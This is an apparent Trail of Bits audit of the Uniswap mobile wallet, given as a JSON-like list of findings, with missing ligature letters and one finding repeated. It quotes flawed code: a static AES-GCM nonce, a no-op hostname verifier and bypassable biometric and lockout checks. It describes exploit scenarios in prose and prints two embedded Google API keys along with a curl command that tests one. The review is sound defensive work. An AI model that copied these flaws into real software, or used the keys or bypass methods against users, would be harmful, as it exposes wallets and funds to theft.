Exposure Finding ID: TOB-UNIMOB2-12 Target: Uniswap Android application", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Local biometric authentication is prone to bypasses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet application uses local biometric authentication to authorize sensitive actions like transaction signing or showing the mnemonic screen. The authentication is based on a simple if statement (event-based) and not on any cryptographic primitive or remote endpoint (result-based). Result-based authentication is the recommended way to implement local authentication, because it is harder to bypass. With the result-based authentication, the wallets data cannot be obtained even by attackers with physical access to the device and with root privileges. The event-based authentication can be bypassed by, for example, using dynamic instrumentation on rooted devices or by exploiting operating system vulnerabilities. In the context of self-custody mobile wallets, the result-based authentication should bind biometric authentication with users condential data via a secure hardware (keychain or keystore). That is, the wallet should encrypt users data (private keys, mnemonics, etc.) using a secure hardware API. Then the hardware should be used to decrypt the data on-demand (e.g., for transaction signing or showing mnemonic view screen), and the hardware should authorize the decryption operation with biometrics (or screen lock PIN or password). The Uniswap mobile wallet performs biometric authentication with the tryLocalAuthenticate function, which uses the authenticateAsync function from the Expo LocalAuthentication library. This library does not provide a mechanism to implement result-based authentication. const result = await authenticateAsync(authenticateOptions) if (result.success === false) { return BiometricAuthenticationStatus.Rejected } Figure 13.1: The event-based local authentication implemented in the tryLocalAuthenticate function ([redacted]) On Android, result-based authentication can leverage the CryptoObject class to bind biometric authentication with cryptographic primitives. On iOS, a Keychain with a proper access control ag can be used. The issue is of high diculty because exploitation requires root access to the device. Exploit Scenario Bob steals Alices mobile device. He uses a public exploit to gain temporary root access to the device. He modies the /data/data/com.uniswap.dev/files/mmkv/mmkv.default le to change the wallets state, disabling biometric requirements. He then opens the wallet, displays a plaintext mnemonic, and uses it to steal all of Alices funds. Recommendations Short term, reimplement local authentication to be result-based. Preferably, users private keys and mnemonics should be stored encrypted with keychains or keystores key, and decrypted only on-demand and with biometric or screen lock PIN or password authorization. This solution may require replacing the currently used react-native Expo library. The event-based local authentication may be kept for app access authentication, as this authentication does not protect any condential information. However, we recommend implementing result-based authentication even for that part of authentication in order to store data that is not condential but still sensitive, such as wallets addresses and mnemonic IDs in encrypted form. Alternatively, ensure that the non-condential data is stored encrypted with operating system mechanisms like the Data Protection entitlement. Congure the wallet to require reauthorization before any action (instead of using time-based unlocking). This can be done with the setUserAuthenticationRequired and setUserAuthenticationParameters methods on Android, and SecAccessControlCreateFlags ags on iOS. On Android, the RnEthersRs class that uses Encrypted Shared Preferences can be leveraged, as it is already responsible for decrypting users mnemonics and private keys. Invalidate keys when a new ngerprint is added with the InvalidatedByBiometricEnrollment ag on Android and the biometryCurrentSet ag on iOS. Please note that this will require the user to recover the mnemonic whenever they change their devices PIN or add new ngerprints. Ensure the keychain item is constrained by the device state, preferably with the kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly accessibility class ag on iOS and using the canAuthenticate method on Android. For iOS, ensure that the item belongs to the wallets Access Group. Ensure that decrypted (plaintext) users private keys and mnemonics are not kept in wallet process memory when not necessary. This security measure will limit the time window for forensics attacks. When using the react-native wrapper library, ensure that the library correctly congures both Android and iOS authentication. Assuming that biometric requirement settings are left congurable, and depending on the actual implementation of the recommendations above, Reacts storage used to persist these settings may require encryption. Otherwise, an adversary may be able to modify a plaintext le to disable the result-based authentication. For example, the currently used react-native-mmkv modules encryptionKey setting may be used for encryption. Please note that it requires further security investigation to determine if using the encryptionKey setting is enough to protect the wallet. Long term, implement a second-factor authentication mechanism in addition to biometric authentication. Example second factors include user-provided passwords, passkeys, single sign-on with third-party identity providers, hardware devices like Yubico and Ledger, or login to a remote Uniswap service. User-provided passwords are a common mechanism for additional data encryption. Such solutions usually work by asking users to input their passwords, deriving the encryption key from the provided password, and decrypting users data with it. The password should be used only in addition to the more convenient biometric or screen lock PIN authentication. This mechanism would protect users data against oine attacks on the mobile devices secure hardware. References  OWASP: Local Authentication on Android and Local Authentication on iOS guidances  Leonard Eschenbaum: Bypassing Android Biometric Authentication, June 12, 2023  Panagiotis Papaioannou: A closer look at the security of React Native biometric libraries, April 6,", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "14. Wallet private keys and mnemonics may be kept in RAM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap Android mobile wallet decrypts data stored in encrypted shared preferences and caches the data in the wallet process memory. The cache is implemented in the RnEthersRs class (gure 14.1). The data contains plaintext private keys. Therefore, plaintext private keys may be kept unencrypted in RAM until the application is closed, even when the phone is locked. private fun retrieveOrCreateWalletForAddress(address: String): Long { val wallet = walletCache[address] if (wallet != null) { return wallet } val privateKey = retrievePrivateKey(address) val newWallet = walletFromPrivateKey(privateKey) walletCache[address] = newWallet return newWallet } Figure 14.1: The method of the RnEthersRs class that caches private keys in memory ([redacted]) The issue is informational because the wallet React application creates new instances of the RnEthersRs class on-demand (e.g., as shown in gure 14.2); therefore, the cache implemented by the class is short-living. However, this behavior invalidates the benets of having a cache, so it may be assumed that the intended use of the RnEthersRs class is to be a singleton. Moreover, the class is registered as a native module (gure 14.3), which again indicates that the class was intended to be a singleton. val ethersRs = RnEthersRs(reactContext) Figure 14.2: Example use of the RnEthersRs class ([redacted]) override fun createNativeModules( reactContext: ReactApplicationContext ): List<NativeModule> = listOf( RNEthersRSModule(reactContext), ThemeModule(reactContext), ) Figure 14.3: The RnEthersRs class is registered as a native module. ([redacted]) Exploit Scenario An attacker steals a users phone but cannot unlock it. He exltrates the RAM content, which contains the users private keys. The attacker uses the private key to take over the users wallet and drain her funds. Recommendations Short term, remove the cache mechanism from the RnEthersRs class so that data stored in encrypted shared preferences is decrypted only on demand. Long term, ensure that the application decrypts sensitive data only when it is needed (e.g., to sign a transaction or to display the wallet mnemonic) and removes it from RAM when it is no longer needed. 15. Wallet sends requests with private data before the application is unlocked Severity: Informational Diculty: High Type: Data Exposure Finding ID: TOB-UNIMOB2-15 Target: Uniswap Android application", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. Wallet does not require a minimum device-access security policy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap wallet application does not enforce a minimum device-access security policy, such as requiring the user to set a device passcode or PIN or to enroll a ngerprint for biometric authentication. If a user removes the operating-system-level PIN, the wallet ceases to require biometric authentication. Moreover, the wallet settings still show enabled for biometric requirements. This behavior may be surprising to users and is a security footgun. The vulnerability is presented in gure 17.1, which shows that the wallet treats both successful authentication and disabled authentication on the operating system level as a success. if ( biometricAuthenticationSuccessful(authStatus) || biometricAuthenticationDisabledByOS(authStatus) ) { successCallback?.(params) } else { failureCallback?.() } Figure 17.1: Part of the useBiometricPrompt method ([redacted]) The issue is informational because it cannot be properly xed without xing TOB-UNIMOB2-13. And if that nding is resolved as recommended, then this nding is also xed. Exploit Scenario A user of the Uniswap wallet enables biometric requirements for application access and transactions in the wallet. Then, he turns o biometric authentication on the OS level. He is convinced that the wallet is still protected with biometric authentication. The attacker steals the users phone and gets access to his private keys. The user blames Uniswap for failing to protect the wallet. Recommendations Short term, implement result-based authentication as recommended in nding TOB-UNIMOB2-13. This will mitigate the vulnerability described in this nding, as disabling the device-access security policy would make the wallet unusable on the cryptographic level. If the user has enabled biometric authentication requirements in the wallet but has disabled OS-level authentication, then switch o the requirements so that users will not be misguided. Consider whether disabling or changing OS-level authentication should make the wallet delete all data, as is recommended in TOB-UNIMOB2-13.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "18. Bypassable password lockout due to reliance on the phone's clock for time comparisons ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The password lockout feature relies on the Date.now function to calculate the time left until a user can attempt to enter a password again. The Date.now function uses the systems clock, so an attacker can brute force the password by repeatedly trying a new password and advancing the phones clock to bypass the lockout feature. function calculateLockoutEndTime(attemptCount: number): number | undefined { if (attemptCount < 6) { return undefined } [skipped] if (attemptCount % 2 === 0) { return Date.now() + ONE_HOUR_MS } return undefined } Figure 18.1: The method for computing lockouts end time ([redacted]) const remainingLockoutTime = lockoutEndTime ? Math.max(0, lockoutEndTime - Date.now()) : 0 const isLockedOut = remainingLockoutTime > 0 Figure 18.2: Code checking if wallet should be locked out ([redacted]) Exploit Scenario An attacker steals a users phone. The attacker tries a large number of passwords from a list of common passwords, changing the phones time back and forth in between each attempt to bypass the lockout feature. The attacker nally learns the correct password and steals the users funds. Recommendations Short term, instead of Date.now, use a source of time that returns the monotonic timestamp since the system booted. When a user reboots their device, the timestamp will return to zero because zero seconds have passed since the system booted. A timestamp that is more recent than the timestamp of the last failed password attempt indicates that the system has rebooted and that the stored timestamp can safely be updated to zero. This measure means that users will have to wait through the full lockout time again after a reboot, but it ensures that attackers cannot manipulate the time left on a lockout. For monotonic timestamps on Android, use the elapsedRealtime function, and on iOS, use the clock_gettime function with the CLOCK_MONOTONIC argument.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "19. Debuggable WebViews ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The OneSignal SDK enables debugging of web contents loaded into any WebViews of the application for the debugging log level (gure 19.1) by the setWebContentsDebuggingEnabled ag. The OneSignal SDK allows Chrome Remote Debugging if OneSignal.LOG_LEVEL is equal to level DEBUG (5) or higher. The Uniswap mobile application has a verbose (6) log level enabled (gure 19.2), so any malicious application could inspect or modify the state of any WebView in the application. It is worth noting that access to the WebView context is not limited to OneSignal only; for example, it is possible to access the Privacy Policy view in the application. private static void enableWebViewRemoteDebugging() { if (Build.VERSION.SDK_INT < 19 || !OneSignal.atLogLevel(OneSignal.LOG_LEVEL.DEBUG)) { return; } WebView.setWebContentsDebuggingEnabled(true); } Figure 19.1: The enableWebViewRemoteDebugging method in the com.onesignal.WebViewManager package // 0 = None, 1 = Fatal, 2 = Errors, 3 = Warnings, 4 = Info, 5 = Debug, 6 = Verbose export const initOneSignal = (): void => { OneSignal.setLogLevel(6, 0) Figure 19.2: OneSignal setup in the Uniswap mobile wallet ([redacted]) Exploit Scenario An attacker discovers that OneSignal uses the Chrome DevTools protocol for debugging, which exposes the content in WebViews over Unix domain sockets. He prepares the malicious application that snis the content of a WebView in the Uniswap mobile application. An attacker obtains the sensitive data from the Uniswap mobile wallet, which is then used to steal funds. Recommendations Short term, change the setLogLevel (gure 19.2) to level 4 or lower. Long term, periodically check if the application exposes debuggable content on an Android device from the development machine. Also, using the jadx-gui tool, check if the decompiled APK contains the setWebContentsDebuggingEnabled ag and under what circumstances it enables debugging. References  Chrome for Developers: Remote debug Android devices  react-native-onesignal: Disabled setWebContentsDebuggingEnabled", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "20. Miscongured GCP API key exposed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Google Cloud Platform API key is embedded in the Uniswap mobile wallet code (gure 20.1, 20.2), which makes it publicly accessible. A test of the API key endpoint responds with an HTTP 200 status code, denoting insucient key restrictions (gure 20.3). This could result in unanticipated costs and changes to the applications quota. <string name=\"google_api_key\">AIzaSyClPibETzdx02cLZtOW5oH7-nrpWDk77bI</string> <string name=\"google_crash_reporting_api_key\">AIzaSyClPibETzdx02cLZtOW5oH7-nrpWDk77bI</strin g> Figure 20.1: The part of the res/values/strings.xml le in the decompiled Uniswap mobile APK AIzaSyARi91A4ka3Tgk_lmbtF5pQE8kvt-odYr4 Figure 20.2: The part of the GoogleService-Info.plist le in the iOS Uniswap.app application $ curl https://www.googleapis.com/discovery/v1/apis\\?key\\=AIzaSyClPibETzdx02cLZtOW5oH7-nrpW Dk77bI { \"kind\": \"discovery#directoryList\", \"discoveryVersion\": \"v1\", \"items\": [ { (...) \"kind\": \"discovery#directoryItem\", Figure 20.3: A proof of the key without sucient restrictions that gives an HTTP 200 response and JSON data Recommendations Short term, specify the Android application that can use the key: set the application restriction to Android apps and add the application package name with the SHA- certicate ngerprint. For the iOS application, set the application restriction to iOS apps and add the bundle ID of the Uniswap iOS application. Long term, periodically review whether the application contains potentially sensitive API keys; if it does, ensure that these keys have congured secure restraints. References  Authenticate by using API keys", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "21. Lack of permissions for device phone number access or SIM card details ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile application references both Phone Number APIs (through the react-native-device-info dependency) and SIM card details (through AppsFlyer) without specifying the necessary permissions, such as Manifest.permission.READ_PHONE_STATE. While the application may not use the Phone Number APIs or the getSimOperatorName method during runtime, their presence in the application binary (gure 21.1, 21.2) or any included SDKs requires permission declaration. This absence of permissions can also lead to Google Play warnings during application review. Figure 21.1: The getPhoneNumberSync method calling getLine1Number telephonyManager = (TelephonyManager) context.getSystemService(\"phone\"); str2 = telephonyManager.getSimOperatorName(); Figure 21.2: Usage of the getSimOperatorName() method from TelephonyManager in the com.appsflyer.internal package Recommendations Short term, if the react-native-device-info or AppsFlyer dependency contains references to the Phone Number APIs or TelephonyManager and is unnecessary, consider removing it or asking the vendors for a build that does not contain code to access the data. If access to the phone number or SIM card details is required, declare the correct permissions.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "22. An insecure HostnameVerier that disables SSL hostname validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The NoopHostnameVerifier class in the org.apache.http.conn.ssl package denes a HostnameVerifier() method that does not validate the servers hostname (gure 22.1). This allows an attacker to perform a PITM attack on a user's connection to spoof the server with the users hostname by providing a certicate from another host. Due to the lack of hostname verication, the client would accept this certicate. It is important to note that, according to the policy, Beginning March 1, 2017, Google Play will block publishing of any new apps or updates that use an unsafe implementation of HostnameVerifier. package org.apache.http.conn.ssl; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.SSLSession; /* loaded from: classes5.dex */ public class NoopHostnameVerifier implements HostnameVerifier { public static final NoopHostnameVerifier INSTANCE = new NoopHostnameVerifier(); public final String toString() { return \"NO_OP\"; } @Override // javax.net.ssl.HostnameVerifier public boolean verify(String str, SSLSession sSLSession) { return true; } } Figure 22.1: The decompiled NoopHostnameVerifier class in the jadx-gui tool The issue is of informational severity because we were unable to exploit this nding by using a certicate signed by a valid CA but for invalid hostnames. In this case, logcat shows an SSL error. Exploit Scenario From the users perspective: An attacker carries out a PITM attack by using a CA-signed certicate issued for a domain the attacker owns. Because the implementation of the HostnameVerifier method accepts any certicate signed by a valid CA for any hostname, the attackers certicate is accepted. From the application owners perspective: The application is removed from or is blocked from being published in Google Play because of the unsafe implementation of the HostnameVerifier method, which does not validate hostnames. Recommendations Short term, identify which library introduces the vulnerable code and follow potential xes to ensure that the Uniswap mobile wallet uses the default hostname validation logic or that the custom HostnameVerifier interface returns false when the servers hostname does not meet the expected value. References  Google Help: How to resolve Insecure HostnameVerier 23. Sentry SDK uses getRunningAppProcesses to get a list of running apps Severity: Informational Diculty: High Type: Data Exposure Finding ID: TOB-UNIMOB2-23 Target: Uniswap Android application", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "24. BIP44 spec is not followed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet automatically imports at most the rst 10 wallets associated with a mnemonic. Therefore, if a user has a mnemonic associated with more than 10 wallets, the Uniswap wallet will automatically import only the rst 10. BIP44 species that wallets should be imported until 20 subsequent addresses have no transaction histories (address gap limit). export const NUMBER_OF_WALLETS_TO_IMPORT = 10 Figure 24.1: Hard-coded limit of imported wallets ([redacted]) Moreover, the Uniswap wallet lters unused wallets by balances, instead of transaction history, as the BIP44 species. const accountsWithBalance = filteredAccounts?.filter( (address) => address.balance && address.balance > 0 ) if (accountsWithBalance?.length) return accountsWithBalance Figure 24.2: Filtering wallets by their balances ([redacted]) Recommendations Short term, as specied by BIP44, revise the code so that it keeps searching for wallets until it nds a gap of 20 unused wallets. Consider making a hard limit or pagination for wallets so that a bug in remote services that reports transaction histories will not make the wallet loop innitely. Filter unused wallets by their transaction histories and not by actual balances. Long term, ensure that the BIP44 implementation matches the BIP44 specication. Allow users to import wallets with arbitrary derivation paths.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "25. SafetyNet Verify Apps API not implemented in the Android client ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap Android application does not use the SafetyNet Verify Apps API. Google Play provides the SafetyNet Verify Apps API to check whether potentially harmful applications are on a users device. Through the Verify Apps feature, Google monitors and proles the behavior of Android applications, informs users of potentially harmful applications, and encourages users to delete them. However, users are free to disable this feature and to ignore these warnings. The SafetyNet Verify Apps API can tell Uniswap whether the Verify Apps feature is enabled and whether potentially malicious applications remain on the users device. Uniswap can then take actions like warning users or disabling access to the wallet until the user resolves the problem or accepts the risk. This can provide an additional line of defense. Please note that the SafetyNet Verify Apps API is distinct from the deprecated SafetyNet Attestation API, and the SafetyNet Verify Apps API should be used together with the Play Integrity API. The Play Integrity API veries that interactions and server requests come from the genuine application binary running on a real Android device. By detecting potentially risky and fraudulent interactions, such as from tampered-with application versions and untrusted environments, the applications back-end server can respond appropriately to prevent attacks and reduce abuse. The Play Integrity API is a continuation of the deprecated SafetyNet Attestation API. Exploit Scenario Bob has unknowingly installed a malicious application, which the Verify Apps feature detects. He ignores the warnings to uninstall the application because it includes a game that he enjoys. He also uses the Uniswap application on the same device. The malicious application exploits an unpatched vulnerability in the Android system to extract the wallet keys from the phone RAM. The malicious application also tricks Bob into transferring his assets to a third party via a tapjacking attack. Recommendations Short term, implement the SafetyNet Verify Apps API to require that the Verify Apps feature be enabled for all Uniswap users and to ensure that known harmful applications are not installed on users devices. If malicious applications are detected by the API, alert wallet users about that, and instruct them on recommended actions they should take (e.g., uninstalling the applications in question). Long term, stay updated on new security features introduced in Android and continue adding relevant safety protections to the Uniswap mobile application. For added security protection, consider verifying the device's integrity using the Play Integrity API before using the Verify Apps API. References  Android Developers: SafetyNet Verify Apps API  Android Developers: App Security Best Practices", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Static AES-GCM nonce used for cloud backup encryption ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The cloud backup feature of the Uniswap mobile wallet allows users to store encrypted mnemonics in the Google Drive application data folder. AES-GCM cipher mode is used for the encryption. The mode requires a unique, random nonce for every encryption operation. However, the Uniswap mobile wallet uses a constant nonce of 16 zeros. The vulnerable nonce generation is highlighted in gure 4.1. fun encrypt(secret: String, password: String, salt: String): String { val key = keyFromPassword(password, salt) val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\") cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, \"AES\"), IvParameterSpec(ByteArray(16))) val encrypted = cipher.doFinal(secret.toByteArray(Charsets.UTF_8)) return Base64.encodeToString(encrypted, Base64.DEFAULT) } Figure 4.1: AES-GCM encryption called by the backupMnemonicToCloudStorage function ([redacted]) While using constant nonces with AES-GCM is usually a critical vulnerability, the impact of the bug is reduced in the context of the Uniswap mobile wallet because the encryption key changes before every encryption. The key is derived from a password and a random salt, as shown in gures 4.1 and 4.2. val encryptionSalt = generateSalt(16) val encryptedMnemonic = withContext(Dispatchers.IO) { encrypt(mnemonic, password, encryptionSalt) } Figure 4.2: Part of the backupMnemonicToCloudStorage function ([redacted]) If the encryption key had been reused, the following attacks would be possible:  Authentication key recovery: The sub-key of the encryption key used for ciphertext authentication could be recovered from a few ciphertexts. This would allow an attacker to modify ciphertext in a meaningful way and recompute a valid authentication tag for the new version.  Reuse of keystream: The XOR of two ciphertexts would result in the XOR of two plaintexts. Given such data, an attacker could perform statistical analysis to recover both plaintexts. Exploit Scenario 1 In future releases of the Uniswap mobile wallet, the random salt is reused in a few subsequent encryptions. Users upload their mnemonics encrypted with a key that is the same for a few ciphertexts. The encrypted mnemonics are stolen from Google Drive and XORed pairwise. The criminals perform statistical analysis and obtain mnemonics in plaintext. They steal all users tokens. Exploit Scenario 2 Users reverse-engineer the Uniswap mobile wallet and learn that a constant nonce is used for AES-GCM encryption of backups. They publicly discuss this information on X (Twitter). Uniswaps credibility is negatively impacted. Recommendations Short term, replace the constant 16-byte nonce with a randomly generated, unique nonce in the encrypt function. Consider using nonces that are 12 bytes long instead of 16 bytes, as this length is more standard. Ensure that a strong, cryptographically secure pseudorandom number generator is used. Long term, create an inventory of ciphers and cryptographic parameters used in the Uniswap mobile wallet. An inventory could easily catch vulnerabilities like weak parameters or incorrect generation of certain cryptographic data. The inventory must be kept up-to-date to be useful, so an internal process should be created for that task. For example, any pull request changing cryptographic code should include an update to the inventory. Moreover, the inventory should be periodically compared to the current cryptographic standards. References  Antoine Joux, Authentication Failures in NIST version of GCM", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "5. Argon2i algorithm is used instead of Argon2id ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet encrypts cloud backups with a key derived from a users password and a random salt. The Argon2i algorithm is used for this task. This algorithm has a few known attacks that reduce its memory requirements. Therefore, it is more prone to brute-force attacks than the recommended Argon2id algorithm. fun keyFromPassword(password: String, salt: String): ByteArray { val hash: Argon2KtResult = Argon2Kt().hash( mode = Argon2Mode.ARGON2_I, password = password.toByteArray(Charsets.UTF_8), salt = salt.toByteArray(Charsets.UTF_8), tCostInIterations = 3, mCostInKibibyte = 65536, parallelism = 4 ) return hash.rawHashAsByteArray() } Figure 5.1: Key derivation function using Argon2i algorithm ([redacted]) Dierences between variants of the Argon2 algorithms are explained in RFC 9106 (see gure 5.2). Argon2id provides both protection from side-channel analysis and brute-force attacks, while Argon2i focuses on the former. Figure 5.2: Section 1 of RFC 9106 (https://www.rfc-editor.org/rfc/rfc9106.html#name-introduction) Moreover, there is a bug in the salt generation function. The salt is Base64-encoded (see gure 5.3) and is not decoded to raw bytes before being passed to the Argon2i function. While this bug does not have security consequences, it may raise suspicion for users reading the code. Moreover, the library implementing the Argon2 function may misuse the encoded salt and, for example, truncate it to a predened length, thereby reducing entropy. fun generateSalt(length: Int): String { val bytes = ByteArray(length) val secureRandom = SecureRandom() secureRandom.nextBytes(bytes) return Base64.encodeToString(bytes, Base64.DEFAULT) } Figure 5.3: Base64-encoding of salt ([redacted]) Exploit Scenario Adversaries steal encrypted backups from Google Drive. They perform brute-force attacks on the stolen data. The time and cost to conduct the attack are much lower than one would expect due to the usage of a weaker-than-possible algorithm. Recommendations Short term, replace the Argon2i function with Argon2id. This will protect the key derivation from both side-channel and brute-force attacks. Please note that Argon2d is not recommended, as the threat model of a mobile application includes side-channel attacks (e.g., performed by a malicious application running in the background). Long term, create an inventory of cryptographic algorithms and parameters, as recommended to mitigate nding TOB-UNIMOB2-4. Provide reasoning for every algorithm and parameter choice that is not obvious. References  Dan Boneh, Henry Corrigan-Gibbs, and Stuart Schechter: Balloon Hashing: A Memory-Hard Function Providing Provable Protection against Sequential Attacks  Jol Alwen and Jeremiah Block: Towards Practical Attacks on Argon2i and Balloon Hashing", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Lack of certicate pinning for connections to the Uniswap server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap mobile wallet does not use certicate pinning to require HTTPS connections to the Uniswap server to use a specic and trusted certicate or to be signed by a specic certicate authority (CA). Certicate pinning is a method of allowing a specic server certicate or public key within an application to reduce the impact of person-in-the-middle (PITM) attacks. When making a connection to the back-end server, if the certicate presented by the server does not match the signature of the pinned certicate, the application should reject the connection. The more general approach for certicate pinning is to limit the set of trusted CAs to only those that are actually used by a system. The issue is of high diculty because a successful attack requires installing a new CA on a target device or compromising one of the CAs trusted by the device. A CA compromise would be a security incident impacting the whole internet, and the chance that adversaries would target the Uniswap wallet is small. Moreover, modern mobile operating systems have mitigations for compromised CA incidents. The impact of a successful PITM attack is similar to what would have happened if somebody compromised the Uniswap server, so it is of low severity (from the perspective of the wallet users). Exploit Scenario 1 As part of a high-prole attack, an attacker compromises a CA and issues a malicious but valid SSL certicate for the server. Several trusted CAs have been compromised in the past, as described in this Google Security blog post. Exploit Scenario 2 An attacker tricks a user into installing a CA certicate within their device's trust store. The attacker issues a malicious but valid SSL certicate and performs a PITM attack. Recommendations Short term, implement certicate pinning by embedding the specic certicates. If the server rotates certicates on a regular, short basis, then instead of pinning server certicates, limit the set of trusted CAs to the ones that will be used by the server. Long term, implement unit tests that verify that the application accepts only the pinned certicate. References  OWASP: Certicate and Public Key Pinning Control  TrustKit: Easy SSL pinning validation and reporting for iOS, macOS, tvOS, and watchOS", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Third-party applications can take and read screenshots of the Android client screen ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The android.media.projection API, introduced in Android 5.0, allows any third-party application on an Android device to take a screenshot of other running applications, including the Uniswap mobile wallet. A third-party application can capture everything on the devices screen, including sensitive information such as mnemonics and PIN codes, and may continue recording the screen even after the user terminates the application (but not after the user reboots the device). Enabling the FLAG_SECURE ag in the Uniswap client will prevent third-party applications from taking screenshots of the Uniswap mobile wallet. The nding is of high diculty because the user would have to install malicious software on their device, and then the software would have to correctly guess the time point at which to make the screenshot. The severity of the nding is medium because the worst-case result of a successful exploit is that the users private keys would be stolen. Exploit Scenario Alice prepares a malicious application, which Bob installs. Alices application secretly records Bobs Uniswap mobile application while he is looking at his wallet mnemonic. The malicious application exltrates the mnemonic, and Alice steals Bobs wallet. Recommendations Short term, protect all sensitive windows within the Uniswap Android application by enabling the FLAG_SECURE ag. This will prevent malicious third-party applications from recording the application and from taking screenshots of sensitive information. Also, the FLAG_SECURE ag will hide the Uniswap application in the Overview screen. Long term, ensure that the developer documentation is updated to include screen capture and recording as potential threats for data exposure.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "14. Wallet private keys and mnemonics may be kept in RAM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "The Uniswap Android mobile wallet decrypts data stored in encrypted shared preferences and caches the data in the wallet process memory. The cache is implemented in the RnEthersRs class (gure 14.1). The data contains plaintext private keys. Therefore, plaintext private keys may be kept unencrypted in RAM until the application is closed, even when the phone is locked. private fun retrieveOrCreateWalletForAddress(address: String): Long { val wallet = walletCache[address] if (wallet != null) { return wallet } val privateKey = retrievePrivateKey(address) val newWallet = walletFromPrivateKey(privateKey) walletCache[address] = newWallet return newWallet } Figure 14.1: The method of the RnEthersRs class that caches private keys in memory ([redacted]) The issue is informational because the wallet React application creates new instances of the RnEthersRs class on-demand (e.g., as shown in gure 14.2); therefore, the cache implemented by the class is short-living. However, this behavior invalidates the benets of having a cache, so it may be assumed that the intended use of the RnEthersRs class is to be a singleton. Moreover, the class is registered as a native module (gure 14.3), which again indicates that the class was intended to be a singleton. val ethersRs = RnEthersRs(reactContext) Figure 14.2: Example use of the RnEthersRs class ([redacted]) override fun createNativeModules( reactContext: ReactApplicationContext ): List<NativeModule> = listOf( RNEthersRSModule(reactContext), ThemeModule(reactContext), ) Figure 14.3: The RnEthersRs class is registered as a native module. ([redacted]) Exploit Scenario An attacker steals a users phone but cannot unlock it. He exltrates the RAM content, which contains the users private keys. The attacker uses the private key to take over the users wallet and drain her funds. Recommendations Short term, remove the cache mechanism from the RnEthersRs class so that data stored in encrypted shared preferences is decrypted only on demand. Long term, ensure that the application decrypts sensitive data only when it is needed (e.g., to sign a transaction or to display the wallet mnemonic) and removes it from RAM when it is no longer needed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Wallet sends requests with private data before the application is unlocked ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "When the application launches while still awaiting to be unlocked by biometric or PIN authentication, the application starts fetching prole information over the network. This leads to the disclosure of information about the wallet registered in the application without needing to unlock it rst. The wallet information is public, but associating a device or application instance with an account without needing to unlock the application is still a privacy issue. Requests sent before the wallet is unlocked go to the api.uniswap.org endpoint, which contains operations like TransactionList and PortfolioBalances as well as the addresses of the currently registered mnemonic. Recommendations Short term, do not send HTTP requests before the application is unlocked.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "16. Biometric is not enabled for application access after enrollment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf", "body": "There are two settings for biometric authentication in the Uniswap mobile wallet: application access and transaction signing. When enabling biometric authentication during initial application enrollment, only the latter is enabled, and users are not informed that they should explicitly enable the other biometric setting. Figure 16.1: Default settings for biometric authentication after initial enrollment This issue is only informational because it is the wallet users responsibility to congure the wallet securely. Nevertheless, implementing the recommendations provided below would make the application more secure by default, or at least would increase users awareness of the security-relevant congurations. Exploit Scenario Alice installs the Uniswap mobile wallet application and enables biometric authentication during initial enrollment. She is unaware that biometric authentication was enabled only for transaction signing and that there is a separate setting for application access. She views her mnemonic, authorizing access with a ngerprint. She then moves the wallet application to the background and uses other applications. Suddenly, Bob grabs Alices phone, runs, and later moves the wallet application to the 